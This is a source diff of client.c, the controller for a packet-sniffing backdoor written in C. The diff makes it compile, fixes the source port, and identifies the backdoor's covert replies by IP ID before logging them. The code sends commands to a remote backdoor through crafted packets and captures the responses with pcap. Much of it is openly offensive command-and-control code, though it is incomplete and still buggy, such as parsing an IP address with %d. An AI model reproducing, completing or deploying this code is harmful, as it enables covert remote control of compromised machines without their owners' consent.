@@ -1,9 +1,24 @@
+/**
+ * client.c
+ */
 
-void backdoor_client(uint32 ipaddress, int protocol)
+#include "client.h"
+
+int main (int argc, char * argv[]) {
+
+	backdoor_client(argv[1], argv[2]);
+
+	return 0;
+}
+
+void backdoor_client(char* ipaddr, char* protocol)
 {
 	client *cln;
 	char *cmd;
 	pthread_t pth_id;
+	int ipaddress;
+
+	sscanf(ipaddr, "%d", &ipaddress);
 
 	// pcap variables to determine source IP
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -22,7 +37,7 @@ void backdoor_client(uint32 ipaddress, int protocol)
 		perror("Invalid IP Address");
 	}
 
-	if(protocol != "TCP" || protocol != "UDP" ) {
+	if((strcmp(protocol,"TCP") != 0) && (strcmp(protocol,"UDP") != 0)) {
 		perror("Invalid Protocol");
 	}
 
@@ -31,20 +46,21 @@ void backdoor_client(uint32 ipaddress, int protocol)
 	// open the device for live capture
 	if ((pd = pcap_open_live("ens33", BUFSIZ, 1, 0, errbuf)) == NULL) {
 		printf("pcap_open_live(): %s\n", errbuf);
-		return NULL;
+		exit(1);
 	}
 
 	// get network device source IP address and netmask
 	if (pcap_lookupnet("ens33", &srcip, &netmask, errbuf) < 0) {
 		printf("pcap_lookupnet(): %s\n", errbuf);
-		return NULL;
+		exit(1);
+
 	}
 
 	cln = client_new(); 			// create and initialize a new client struct
 
 	// set client structure
 	cln->source_host = srcip;
-	cln->source_port = "0x00";
+	cln->source_port = 4096;
 	cln->dest_host = ipaddress;
 	cln->dest_port = 80;
 
@@ -55,8 +71,8 @@ void backdoor_client(uint32 ipaddress, int protocol)
 	 */
 	printf("\n\nSending commands to: \n");
 	printf("============================\n\n");
-	printf("Destination	: 	%s:%u\n", cln->desthost, cln->dest_port);
-	printf("Source		: 	%s:%u\n", cln->srchost, cln->source_port);
+	printf("Destination	: 	%d:%u\n", cln->dest_host, cln->dest_port);
+	printf("Source		: 	%d:%u\n", cln->source_host, cln->source_port);
 
 	printf("\n");
 
@@ -73,10 +89,10 @@ void backdoor_client(uint32 ipaddress, int protocol)
 		//sniffer_thread((void *)"em1");
 	}
 
-	pthread_join(pth_id);
+	pthread_join(pth_id, NULL);
 	printf("\nExiting the Controller........\n\n");
 
-	return EXIT_SUCCESS;
+	//return EXIT_SUCCESS;
 }
 
 
@@ -126,11 +142,7 @@ void packet_new(client *c, char *msg) {
 	//msg = (char *)xor_encrypt(msg);
 	strcpy(packets.data, msg);
 
-	if (c->src_port) 			// if source port is SET
-		packets.tcp.source = htons(c->source_port);
-	else
-		packets.tcp.source = htons(
-				1 + (int) (10000.0 * rand() / (RAND_MAX + 1.0)));
+	packets.tcp.source = htons(c->source_port);
 
 	packets.tcp.dest = htons(c->dest_port);
 
@@ -283,7 +295,7 @@ void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet) {
 	}
 
 	// hex of boss 626f7373
-	if (ntohs(iphdr->id) == "boss") {
+	if (ntohs(iphdr->id) == 5002) {
 		file = fopen("results.log", "a+");
 		tcp_payload = (char *) (packet + sizeof(struct ether_header) + size_ip
 				+ size_tcp);
@@ -297,3 +309,4 @@ void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet) {
 		//running = false;
 	}
 }
+
